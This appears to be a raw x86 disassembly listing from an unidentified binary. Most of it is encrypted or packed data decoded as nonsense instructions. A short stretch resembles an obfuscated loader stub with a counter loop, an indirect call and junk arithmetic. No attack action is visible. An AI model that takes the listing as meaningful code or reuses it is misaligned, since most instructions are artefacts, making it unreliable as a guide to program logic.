  40bc7f:	mov    ah,0x28
  40bc81:	sub    eax,0xbdd1dc76
  40bc86:	pop    esi
  40bc87:	or     DWORD PTR [esi+ebx*1],0x0
  40bc8b:	sub    DWORD PTR [eax+0x14],ebp
  40bc8e:	aaa    
  40bc8f:	xor    dh,BYTE PTR [ecx]
  40bc91:	mov    eax,0x2ce7fbf9
  40bc96:	and    al,0x12
  40bc98:	push   0x30
  40bc9a:	test   DWORD PTR [ecx],ebx
  40bc9c:	cmp    al,bh
  40bc9e:	sti    
  40bc9f:	jecxz  0x40bc32
  40bca1:	jg     0x40bc59
  40bca3:	fild   DWORD PTR [esi-0x26]
  40bca6:	je     0x40bc43
  40bca8:	test   DWORD PTR [edx],eax
  40bcaa:	fwait
  40bcab:	adc    eax,DWORD PTR [eax+0x2ec7820d]
  40bcb1:	in     eax,dx
  40bcb2:	sbb    ebp,DWORD PTR [ecx]
  40bcb4:	ja     0x40bd31
  40bcb6:	cmp    al,0x85
  40bcb8:	shl    DWORD PTR [ecx],1
  40bcba:	fstp   TBYTE PTR [esi]
  40bcbc:	push   ebp
  40bcbd:	xchg   ecx,eax
  40bcbe:	cmp    esp,DWORD PTR [esi+0x2d9cd69]
  40bcc4:	xor    BYTE PTR [ebx],cl
  40bcc6:	xor    cl,cl
  40bcc8:	inc    ebp
  40bcc9:	adc    DWORD PTR [eax-0x4a0be3ab],ebx
  40bccf:	push   edi
  40bcd0:	adc    ebp,edx
  40bcd2:	(bad)  
  40bcd3:	out    0x70,al
  40bcd5:	aad    0x70
  40bcd7:	rcl    ch,cl
  40bcd9:	ins    BYTE PTR es:[edi],dx
  40bcda:	bound  esp,QWORD PTR [edx+0x24f022ea]
  40bce0:	(bad)  
  40bce1:	fstp   QWORD PTR ds:0x6400c3bb
  40bce7:	test   eax,0x5bedcb9c
  40bcec:	cmp    esi,DWORD PTR [edi-0x1d5e1188]
  40bcf2:	mov    dl,BYTE PTR [ecx+0x34]
  40bcf5:	(bad)  
  40bcf6:	ror    cl,1
  40bcf8:	dec    edi
  40bcf9:	pop    ds
  40bcfa:	repnz dec eax
  40bcfc:	or     al,0x7f
  40bcfe:	push   0x50
  40bd00:	fsubr  QWORD PTR [edx-0x36]
  40bd03:	sti    
  40bd04:	cmc    
  40bd05:	(bad)  
  40bd06:	int3   
  40bd07:	aas    
  40bd08:	sub    al,0xe5
  40bd0a:	lahf   
  40bd0b:	jae    0x40bd22
  40bd0d:	xchg   esp,eax
  40bd0e:	jns    0x40bce0
  40bd10:	mov    eax,0xfaa907f8
  40bd15:	rol    DWORD PTR [esi+0x3f],1
  40bd18:	pop    ecx
  40bd19:	call   0xfcbf:0xda9dca6b
  40bd20:	and    al,0x8c
  40bd22:	fisttp DWORD PTR [ebx+ebp*4-0x2e4bcfe1]
  40bd29:	push   0xffffffc6
  40bd2b:	aam    0xe8
  40bd2d:	inc    ebx
  40bd2e:	aas    
  40bd2f:	js     0x40bd53
  40bd31:	ret    
  40bd32:	mov    ecx,esi
  40bd34:	cdq    
  40bd35:	or     eax,0x48311ade
  40bd3a:	loope  0x40bcf9
  40bd3c:	repz xor al,0x9
  40bd3f:	mov    fs,WORD PTR [ecx-0x5f7e0d03]
  40bd45:	ror    BYTE PTR [eax-0x5f],1
  40bd48:	shl    esp,0x8
  40bd4b:	aad    0xc2
  40bd4d:	cwde   
  40bd4e:	xchg   edi,eax
  40bd4f:	or     al,BYTE PTR [ebx]
  40bd51:	int3   
  40bd52:	lods   eax,DWORD PTR ds:[esi]
  40bd53:	inc    edx
  40bd54:	lods   al,BYTE PTR ds:[esi]
  40bd55:	adc    BYTE PTR [edx-0x78],dl
  40bd58:	daa    
  40bd59:	in     eax,dx
  40bd5a:	xchg   edi,eax
  40bd5b:	cld    
  40bd5c:	add    ecx,DWORD PTR [edi]
  40bd5e:	cdq    
  40bd5f:	stc    
  40bd60:	into   
  40bd61:	loope  0x40bddd
  40bd63:	mov    BYTE PTR [ebx],ch
  40bd65:	mov    al,ds:0xad92621e
  40bd6a:	test   DWORD PTR [ebx-0x20],esp
  40bd6d:	pop    ebp
  40bd6e:	mov    al,ds:0xfe0ae264
  40bd73:	dec    ecx
  40bd74:	not    BYTE PTR [ecx-0x60]
  40bd77:	mov    ds:0xc2e64e6d,eax
  40bd7c:	add    eax,0x96b01170
  40bd81:	push   edi
  40bd82:	bound  ebx,QWORD PTR [edx]
  40bd84:	lds    eax,FWORD PTR [eax-0x3d]
  40bd87:	pop    eax
  40bd88:	pop    ecx
  40bd89:	xchg   edx,eax
  40bd8a:	push   edi
  40bd8b:	mov    cl,0xe2
  40bd8d:	not    DWORD PTR ds:0x8f11f562
  40bd93:	fadd   DWORD PTR [edx-0x59]
  40bd96:	inc    ebx
  40bd97:	stos   DWORD PTR es:[edi],eax
  40bd98:	dec    eax
  40bd99:	nop
  40bd9a:	mov    cl,0x68
  40bd9c:	inc    esp
  40bd9d:	push   ds
  40bd9e:	ja     0x40be1f
  40bda0:	or     ch,BYTE PTR [eax]
  40bda2:	test   al,0xff
  40bda4:	xchg   esi,eax
  40bda5:	fldln2 
  40bda7:	outs   dx,BYTE PTR ds:[esi]
  40bda8:	aad    0xaa
  40bdaa:	jle    0x40bd94
  40bdac:	sbb    bl,al
  40bdae:	mov    ah,BYTE PTR [ebp-0x11e78914]
  40bdb4:	out    dx,al
  40bdb5:	pop    ebp
  40bdb6:	(bad)  [eax-0x371b071f]
  40bdbc:	jne    0x40bdbf
  40bdbe:	inc    esi
  40bdbf:	inc    eax
  40bdc0:	mov    ebx,esp
  40bdc2:	in     al,0x73
  40bdc4:	mov    ebx,0xf071912
  40bdc9:	and    esi,ebp
  40bdcb:	(bad)  
  40bdcc:	addr16 std 
  40bdce:	arpl   WORD PTR [edi-0x54],ax
  40bdd1:	aas    
  40bdd2:	(bad)  
  40bdd3:	in     al,0x19
  40bdd5:	in     al,0x46
  40bdd7:	jg     0x40be2a
  40bdd9:	imul   ecx,DWORD PTR [ebp-0x29],0x26185cdc
  40bde0:	pushf  
  40bde1:	add    eax,0x52a03ab
  40bde6:	or     al,0x3
  40bde8:	xor    edi,0x4f
  40bdeb:	mov    dl,0xf1
  40bded:	and    esp,DWORD PTR [eax+0x6f5c6fb]
  40bdf3:	sub    al,0x1d
  40bdf5:	sub    al,0x2
  40bdf7:	cmp    cl,al
  40bdf9:	lock jmp 0x4586:0x5ea6395b
  40be01:	pop    ebp
  40be02:	jmp    0xac54:0x4553bead
  40be09:	xor    DWORD PTR [ebp-0x42b22e7e],esp
  40be0f:	fisubr DWORD PTR [edx+edi*2-0x5858e509]
  40be16:	sbb    eax,0x12588b25
  40be1b:	xor    eax,DWORD PTR [ecx]
  40be1d:	jp     0x40bddc
  40be1f:	shl    BYTE PTR [eax+0x5d],1
  40be22:	leave  
  40be23:	stos   DWORD PTR es:[edi],eax
  40be24:	cdq    
  40be25:	cmc    
  40be26:	stos   BYTE PTR es:[edi],al
  40be27:	pop    edi
  40be28:	sbb    DWORD PTR ds:[edx],edi
  40be2b:	fist   DWORD PTR ds:0x3b29aa65
  40be31:	mov    dh,0x77
  40be33:	nop
  40be34:	adc    dh,BYTE PTR [edi+0x4a876951]
  40be3a:	ja     0x40be4a
  40be3c:	test   BYTE PTR [edi],bh
  40be3e:	pop    DWORD PTR [esi+0x31]
  40be41:	test   bh,0x17
  40be44:	dec    esi
  40be45:	shr    DWORD PTR [ebp+0x41],0xa5
  40be49:	jnp    0x40be5d
  40be4b:	sub    DWORD PTR ds:[ecx+0x29],edi
  40be4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be50:	inc    ebp
  40be51:	mov    ah,dl
  40be53:	mov    ds:0x63514acc,al
  40be58:	imul   ebp,DWORD PTR [ecx],0xfffffff4
  40be5b:	mov    ds:0xe9bfb437,al
  40be60:	and    eax,0xf922b8bd
  40be65:	push   es
  40be66:	jae    0x40be2e
  40be68:	imul   edi,DWORD PTR [esi+0x3f9bb832],0x5122e1b4
  40be72:	mov    WORD PTR [ebx],es
  40be74:	cdq    
  40be75:	push   edi
  40be76:	hlt    
  40be77:	pop    eax
  40be78:	sub    ah,ah
  40be7a:	sahf   
  40be7b:	(bad)  
  40be7c:	repnz pop ecx
  40be7e:	push   edx
  40be7f:	xchg   ebp,eax
  40be80:	mov    BYTE PTR [edx],cl
  40be82:	cwde   
  40be83:	fsub   DWORD PTR [eax]
  40be85:	outs   dx,BYTE PTR gs:[esi]
  40be87:	mov    ch,0x73
  40be89:	jmp    0x2989:0xa54e42f6
  40be90:	push   ebp
  40be91:	and    DWORD PTR [edx-0x63e3f1fd],0xdf99b526
  40be9b:	es inc ebp
  40be9d:	cs mov ecx,edx
  40bea0:	lea    esi,[edx+0x60]
  40bea3:	mov    esp,0xe37fd60d
  40bea8:	mov    ebp,0x2accc933
  40bead:	rcr    BYTE PTR [edx],1
  40beaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beb0:	mov    edi,DWORD PTR [ebp+0x8]
  40beb3:	mov    eax,ds:0x424435
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	cmp    DWORD PTR [ebx-0x6b],0xffffffdf
  40c016:	aam    0xe9
  40c018:	jp     0x40c094
  40c01a:	sbb    DWORD PTR [edi+0x7a],ebx
  40c01d:	jp     0x40c094
  40c01f:	cdq    
  40c020:	mov    bh,0x61
  40c022:	gs ret 0xef48
  40c026:	adc    DWORD PTR [ebp-0x50c049de],esp
  40c02c:	xchg   ebx,eax
  40c02d:	xchg   edx,eax
  40c02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c02f:	mov    ebx,0xd05cb57d
  40c034:	shl    ebx,0xdb
  40c037:	mov    ecx,0x1248138c
  40c03c:	jl     0x40bff8
  40c03e:	fbstp  TBYTE PTR [ebp+0x498e6d8a]
  40c044:	sub    al,al
  40c046:	and    DWORD PTR [ebx+0x6b59a265],edx
  40c04c:	aas    
  40c04d:	pop    edi
  40c04e:	retf   0xcef8
  40c051:	push   eax
  40c052:	sar    edx,0xcf
  40c055:	xchg   BYTE PTR [esi+0x5f],bh
  40c058:	into   
  40c059:	pop    es
  40c05a:	cmp    dl,BYTE PTR ds:0x59cf3002
  40c060:	lods   eax,DWORD PTR ds:[esi]
  40c061:	mov    cs,WORD PTR [eax]
  40c063:	mov    ch,bh
  40c065:	loope  0x40c025
  40c067:	sbb    al,bl
  40c069:	xchg   DWORD PTR [edi+0x3c],edx
  40c06c:	jp     0x40c0e6
  40c06e:	mov    bl,0x67
  40c070:	adc    BYTE PTR ss:[edi+0x59],bh
  40c074:	add    esp,ebp
  40c076:	pop    esp
  40c077:	push   edi
  40c078:	data16 sahf 
  40c07a:	jg     0x40c03c
  40c07c:	shr    DWORD PTR [ebx-0x7e718058],cl
  40c082:	push   ss
  40c083:	add    al,0xa6
  40c085:	fisub  DWORD PTR ds:0x8e361aba
  40c08b:	mov    ebx,0xe47a2129
  40c090:	push   edx
  40c091:	ss mov ch,0xd5
  40c094:	dec    esi
  40c095:	add    BYTE PTR [ebx-0x54013558],ah
  40c09b:	loope  0x40c0ee
  40c09d:	xlat   BYTE PTR ds:[ebx]
  40c09e:	scas   eax,DWORD PTR es:[edi]
  40c09f:	jge    0x40c07b
  40c0a1:	push   eax
  40c0a2:	jb     0x40c0e0
  40c0a4:	(bad)  
  40c0a5:	enter  0x28a4,0xd2
  40c0a9:	in     al,0x82
  40c0ab:	aam    0x61
  40c0ad:	dec    ebx
  40c0ae:	push   ebp
  40c0af:	push   edi
  40c0b0:	div    DWORD PTR ds:0x2087a933
  40c0b6:	or     ebx,DWORD PTR [edx-0x6cc97a6c]
  40c0bc:	das    
  40c0bd:	test   DWORD PTR [eax-0x11],eax
  40c0c0:	xor    bh,ah
  40c0c2:	addr16 aaa 
  40c0c4:	pop    edx
  40c0c5:	std    
  40c0c6:	nop
  40c0c7:	cmp    al,0x68
  40c0c9:	dec    ecx
  40c0ca:	aad    0x11
  40c0cc:	mov    DWORD PTR [edx],ebx
  40c0ce:	ins    DWORD PTR es:[edi],dx
  40c0cf:	mov    dl,0x8a
  40c0d1:	pop    es
  40c0d2:	enter  0xab7,0x40
  40c0d6:	inc    ecx
  40c0d7:	xchg   esi,eax
  40c0d8:	les    eax,FWORD PTR [eax]
  40c0da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0db:	fadd   DWORD PTR [ebp-0xd]
  40c0de:	sub    cl,BYTE PTR [bx+di]
  40c0e1:	mov    bl,dl
  40c0e3:	lahf   
  40c0e4:	mov    ds:0x3e5abac7,al
  40c0e9:	test   DWORD PTR [esi-0x74585edc],eax
  40c0ef:	push   edi
  40c0f0:	cld    
  40c0f1:	inc    eax
  40c0f2:	or     al,0xec
  40c0f5:	mov    ss,WORD PTR [ecx+0x566beecf]
  40c0fb:	add    al,0xfc
  40c0fd:	push   0x976cc72d
  40c102:	pop    ebp
  40c103:	rcl    BYTE PTR [eax-0x5bd87fcf],1
  40c109:	rcr    BYTE PTR fs:[ecx-0xe69be83],1
  40c110:	pop    esi
  40c111:	inc    esp
  40c112:	icebp  
  40c113:	js     0x40c0ae
  40c115:	dec    ebx
  40c116:	fadd   st(3),st
  40c118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c119:	std    
  40c11a:	mov    ebx,0x90a4eb0a
  40c11f:	cwde   
  40c120:	arpl   WORD PTR [edx-0x11a653da],dx
  40c126:	ins    BYTE PTR es:[edi],dx
  40c127:	pop    esp
  40c128:	push   cs
  40c129:	jno    0x40c0cb
  40c12b:	clc    
  40c12c:	or     DWORD PTR [edi],ebx
  40c12e:	jnp    0x40c0d9
  40c130:	int    0x3b
  40c132:	fisttp QWORD PTR [ebp+0x68]
  40c135:	hlt    
  40c136:	aam    0xaf
  40c138:	xor    cl,ah
  40c13a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c13b:	cmp    al,al
  40c13d:	addr16 ret 
  40c13f:	push   esp
  40c140:	push   ecx
  40c141:	cdq    
  40c142:	sub    eax,DWORD PTR [ebp+0x6f]
  40c145:	arpl   WORD PTR [edi],sp
  40c147:	stos   BYTE PTR es:[edi],al
  40c148:	or     eax,0x58a174b3
  40c14d:	inc    ecx
  40c14e:	nop
  40c14f:	jle    0x40c0f4
  40c151:	mov    WORD PTR [ecx+0x52f6446],cs
  40c157:	dec    ecx
  40c158:	in     eax,0xc9
  40c15a:	push   ebx
  40c15b:	stos   BYTE PTR es:[edi],al
  40c15c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c15d:	and    ebp,edi
  40c15f:	inc    eax
  40c160:	cs inc eax
  40c162:	rcl    BYTE PTR [eax+0x1],1
  40c165:	add    bh,bh
  40c167:	imul   ecx,DWORD PTR [edx],0xc4b8470e
  40c16d:	xchg   esi,eax
  40c16e:	mov    ebp,0x208eea2
  40c173:	pop    edi
  40c174:	fmul   st(1),st
  40c176:	daa    
  40c177:	jmp    0x4f63173d
  40c17c:	xchg   BYTE PTR [esi],bl
  40c17e:	popf   
  40c17f:	or     al,0x2b
  40c181:	adc    dl,BYTE PTR [esi]
  40c183:	jl     0x40c140
  40c185:	lahf   
  40c186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c187:	mul    BYTE PTR [esi+0x56]
  40c18a:	outs   dx,DWORD PTR ds:[esi]
  40c18b:	pop    ebx
  40c18c:	xor    eax,edx
  40c18e:	push   edx
  40c18f:	sti    
  40c190:	inc    edi
  40c191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c192:	jns    0x40c174
  40c194:	mov    ecx,0xb0c0bccc
  40c199:	and    al,0xe1
  40c19b:	inc    esp
  40c19c:	sbb    al,0x4e
  40c19e:	add    ch,dh
  40c1a0:	jmp    0x76ae4c55
  40c1a5:	or     edx,ebx
  40c1a7:	mov    al,0xa7
  40c1a9:	pop    ebp
  40c1aa:	(bad)  
  40c1ab:	iret   
  40c1ac:	fsubr  DWORD PTR [esi]
  40c1ae:	pop    edi
  40c1af:	cmp    dh,ah
  40c1b1:	mov    esi,0xbabc652e
  40c1b6:	xor    DWORD PTR [esi-0x4af0fd32],eax
  40c1bc:	fisttp DWORD PTR [eax]
  40c1be:	jmp    0x40c1d6
  40c1c0:	sub    eax,0xd468f6db
  40c1c5:	aas    
  40c1c6:	push   ebp
  40c1c7:	cmp    BYTE PTR [ebx+0x36],0x2
  40c1cb:	adc    eax,0x69e511e5
  40c1d0:	push   cs
  40c1d1:	fwait
  40c1d2:	retf   
  40c1d3:	icebp  
  40c1d4:	inc    esi
  40c1d5:	xchg   edi,eax
  40c1d6:	pop    ecx
  40c1d7:	test   BYTE PTR [eax+0x51],dh
  40c1da:	sub    DWORD PTR [eax],0x585ec33
  40c1e0:	repz in eax,0xfc
  40c1e3:	mov    bh,0x12
  40c1e5:	aad    0xc9
  40c1e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1e8:	fstp   TBYTE PTR [ecx]
  40c1ea:	pop    edi
  40c1eb:	lods   al,BYTE PTR ds:[esi]
  40c1ec:	dec    ebx
  40c1ed:	mov    edi,0x88e9f05c
  40c1f2:	hlt    
  40c1f3:	iret   
  40c1f4:	std    
  40c1f5:	add    al,0x96
  40c1f7:	out    0xbb,al
  40c1f9:	mov    ebp,0xe78d6b93
  40c1fe:	xor    ecx,DWORD PTR [esp+edx*2]
  40c201:	xchg   esi,eax
  40c202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c203:	xchg   BYTE PTR [edi-0x4f],bh
  40c206:	mov    bh,0x77
  40c208:	test   eax,0xbda19688
  40c20d:	jns    0x40c1a8
  40c20f:	lods   eax,DWORD PTR ds:[esi]
  40c210:	pop    edi
  40c211:	inc    edi
  40c212:	leave  
  40c213:	mov    ah,0x81
  40c215:	stos   DWORD PTR es:[edi],eax
  40c216:	jns    0x40c28c
  40c218:	repz jae 0x40c264
  40c21b:	pop    ss
  40c21c:	adc    esi,ecx
  40c21e:	jne    0x40c1d4
  40c220:	fcomp  DWORD PTR [ebp+0x1c34dd2b]
  40c226:	mov    ds:0x532ad141,eax
  40c22b:	inc    ebx
  40c22c:	fwait
  40c22d:	jmp    0xf5c51c6c
  40c232:	mov    al,ds:0x928619b8
  40c237:	les    ecx,FWORD PTR cs:[edx+0x76]
  40c23b:	inc    edi
  40c23c:	or     bl,ch
  40c23e:	sbb    al,0xf3
  40c240:	outs   dx,BYTE PTR ds:[esi]
  40c241:	enter  0xd938,0x45
  40c245:	test   DWORD PTR [ecx-0x44cdd589],ebx
  40c24b:	outs   dx,BYTE PTR ds:[esi]
  40c24c:	repz push esi
  40c24e:	pusha  
  40c24f:	mov    dh,0x42
  40c251:	xchg   ebp,eax
  40c252:	or     cl,BYTE PTR [eax]
  40c254:	mov    gs,ebp
  40c256:	xor    eax,0x649e8331
  40c25b:	xor    edx,DWORD PTR [edi-0x49]
  40c25e:	test   DWORD PTR [ebx],esp
  40c260:	and    BYTE PTR [ebp-0x5d9047ed],0xd3
  40c267:	xchg   edx,eax
  40c268:	repz xor eax,0x693356a5
  40c26e:	ret    
  40c26f:	xchg   esi,eax
  40c270:	test   DWORD PTR [edx-0x6c23c199],ebx
  40c276:	mov    cl,0xd6
  40c278:	or     edx,DWORD PTR [esi]
  40c27a:	fisttp QWORD PTR [ebx+0x6]
  40c27d:	mov    al,0x8b
  40c27f:	mov    dl,0xfd
  40c281:	and    al,0xa7
  40c283:	daa    
  40c284:	cmp    BYTE PTR [esi+eax*2-0x4c],cl
  40c288:	xchg   ecx,eax
  40c289:	add    BYTE PTR [edi-0x44],ah
  40c28c:	mov    esp,0xb06fa87
  40c291:	sbb    BYTE PTR [ecx+0x7776f0ad],bh
  40c297:	in     eax,dx
  40c298:	sub    al,0xdd
  40c29a:	loope  0x40c294
  40c29c:	mov    al,ds:0xc67e6f38
  40c2a1:	sub    al,0xf7
  40c2a3:	mov    bl,0xf8
  40c2a5:	cs mov ecx,0x919a2d2a
  40c2ab:	mov    esp,0x58cfb93b
  40c2b0:	test   eax,0x2ffbb03
  40c2b5:	dec    esp
  40c2b6:	inc    esp
  40c2b7:	mov    ah,0xb3
  40c2b9:	rcl    BYTE PTR [ecx+0x7878614d],cl
  40c2bf:	cld    
  40c2c0:	xlat   BYTE PTR ds:[ebx]
  40c2c1:	or     esp,DWORD PTR [edx-0x3a1f58bd]
  40c2c7:	aaa    
  40c2c8:	add    al,0xa5
  40c2ca:	push   eax
  40c2cb:	ja     0x40c253
  40c2cd:	fs push esp
  40c2cf:	cli    
  40c2d0:	outs   dx,BYTE PTR ds:[esi]
  40c2d1:	in     eax,0x99
  40c2d3:	inc    ebx
  40c2d4:	jge    0x40c294
  40c2d6:	sub    cl,BYTE PTR [ecx]
  40c2d8:	pop    ebp
  40c2d9:	add    ah,0x5
  40c2dc:	outs   dx,DWORD PTR ds:[esi]
  40c2dd:	in     al,dx
  40c2de:	aaa    
  40c2df:	outs   dx,BYTE PTR ds:[esi]
  40c2e0:	inc    eax
  40c2e1:	sub    eax,DWORD PTR [eax+0x5a895c0d]
  40c2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2e8:	mov    bl,ch
  40c2ea:	cli    
  40c2eb:	dec    DWORD PTR [eax+0x7f72709c]
  40c2f1:	cdq    
  40c2f2:	cwde   
  40c2f3:	adc    DWORD PTR ds:0xb36360ab,edx
  40c2f9:	cli    
  40c2fa:	test   eax,0xfc92d0ee
  40c2ff:	xchg   esp,eax
  40c300:	in     eax,0x5e
  40c302:	sub    al,0xec
  40c304:	or     eax,0xd4c927cc
  40c309:	inc    edi
  40c30a:	rcl    BYTE PTR [ebp+0x20bdd602],1
  40c310:	mov    cs,edi
  40c312:	add    al,0x62
  40c314:	int    0xa
  40c316:	(bad)  
  40c317:	ins    DWORD PTR es:[edi],dx
  40c318:	mov    DWORD PTR [ecx],ecx
  40c31a:	mov    eax,ds:0x698d5e70
  40c31f:	mov    edx,0x3d4a0e87
  40c324:	jmp    0x40c347
  40c326:	xor    eax,0x1f61c8bb
  40c32b:	pop    ebx
  40c32c:	sahf   
  40c32d:	xor    DWORD PTR [esi+0x63],ecx
  40c330:	sub    cl,BYTE PTR [esi+eiz*8]
  40c333:	fnsave [ecx-0x6c1877c2]
  40c339:	cmp    bh,dl
  40c33b:	je     0x40c38e
  40c33d:	cmp    eax,0x41f3f331
  40c342:	mov    ebp,0x35af3200
  40c347:	mov    ah,0xee
  40c349:	jbe    0x40c3ae
  40c34b:	ins    BYTE PTR es:[edi],dx
  40c34c:	xchg   edi,eax
  40c34d:	jl     0x40c314
  40c34f:	pusha  
  40c350:	cmp    BYTE PTR [ebx+0x405548d9],0xea
  40c357:	lahf   
  40c358:	stc    
  40c359:	daa    
  40c35a:	adc    eax,0x25ffd358
  40c35f:	jmp    0xd3f4:0x17a89666
  40c366:	cmp    DWORD PTR [eax],edx
  40c368:	lods   eax,DWORD PTR ds:[esi]
  40c369:	and    DWORD PTR [edi],eax
  40c36b:	arpl   WORD PTR [edx],dx
  40c36d:	out    dx,eax
  40c36e:	sbb    DWORD PTR [edi+0x746d3106],0x57f05f0
  40c378:	sub    al,BYTE PTR [edi+0x31]
  40c37b:	cmp    BYTE PTR [esi-0x3c2b2eb4],dh
  40c381:	fdiv   DWORD PTR [ebx]
  40c383:	add    esi,ebx
  40c385:	pop    ds
  40c386:	xor    eax,0x8de86a78
  40c38b:	out    0x40,eax
  40c38d:	ret    0x615c
  40c390:	jno    0x40c359
  40c392:	fiadd  WORD PTR [eax-0x80]
  40c395:	jne    0x40c406
  40c397:	ds popf 
  40c399:	adc    DWORD PTR [ebx-0x34024a55],ebx
  40c39f:	clc    
  40c3a0:	push   0x3c
  40c3a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3a3:	fnstsw WORD PTR [ecx+0x7f7e6c97]
  40c3a9:	jmp    0x911ca8d8
  40c3ae:	pop    es
  40c3af:	lods   eax,DWORD PTR ds:[esi]
  40c3b0:	adc    al,0xf3
  40c3b2:	push   0x33
  40c3b4:	loope  0x40c3e6
  40c3b6:	mov    dl,0x2e
  40c3b8:	outs   dx,DWORD PTR ds:[esi]
  40c3b9:	mov    eax,ds:0xfab07fd6
  40c3be:	or     eax,0x98f10b37
  40c3c3:	mov    bh,0xe4
  40c3c5:	popa   
  40c3c6:	rcr    DWORD PTR [ebp+0x3637f639],1
  40c3cc:	(bad)  
  40c3cd:	imul   dh
  40c3cf:	fist   DWORD PTR [edx+0x57]
  40c3d2:	add    esi,esp
  40c3d4:	ins    BYTE PTR es:[edi],dx
  40c3d5:	mov    ebp,0xf0c05a68
  40c3da:	ror    BYTE PTR [edi+ebp*8-0x47],0xc9
  40c3df:	lea    esi,[edi]
  40c3e1:	xor    BYTE PTR [edi-0x5e],bh
  40c3e4:	push   eax
  40c3e5:	daa    
  40c3e6:	outs   dx,BYTE PTR ds:[esi]
  40c3e7:	(bad)  
  40c3e8:	pop    ebp
  40c3e9:	data16 and BYTE PTR [ecx-0x30],bh
  40c3ed:	pop    esp
  40c3ee:	in     eax,0xc7
  40c3f0:	aas    
  40c3f1:	adc    al,0xac
  40c3f3:	loop   0x40c376
  40c3f5:	jmp    0xa537:0x443828de
  40c3fc:	push   edi
  40c3fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3fe:	sub    DWORD PTR [edi],0x7c
  40c401:	fimul  WORD PTR [edi-0x1dcd30d7]
  40c407:	aaa    
  40c408:	and    esi,DWORD PTR [esp+ebp*2+0x1eb5eddb]
  40c40f:	sub    BYTE PTR [edx+ecx*2+0x1086a7a],cl
  40c416:	xor    al,0xe9
  40c418:	repnz mov dl,0xa9
  40c41b:	mov    dh,0xb8
  40c41d:	pop    esi
  40c41e:	xor    eax,DWORD PTR [eax]
  40c420:	popa   
  40c421:	xchg   edi,eax
  40c422:	in     eax,dx
  40c423:	or     BYTE PTR [edi+0x5785e9f6],dl
  40c429:	jae    0x40c3cf
  40c42b:	aad    0xd5
  40c42d:	cmp    al,0xa8
  40c42f:	hlt    
  40c430:	mov    BYTE PTR [ebx+0x3bd49d85],dl
  40c436:	fdiv   DWORD PTR [ebx-0x5f024646]
  40c43c:	push   esp
  40c43d:	(bad)  
  40c43e:	shl    bh,cl
  40c440:	or     al,0xae
  40c442:	out    0x0,eax
  40c444:	dec    edx
  40c445:	pushf  
  40c446:	mov    cs,WORD PTR [eax]
  40c448:	in     al,dx
  40c449:	and    eax,0xd4673ad9
  40c44e:	aam    0x98
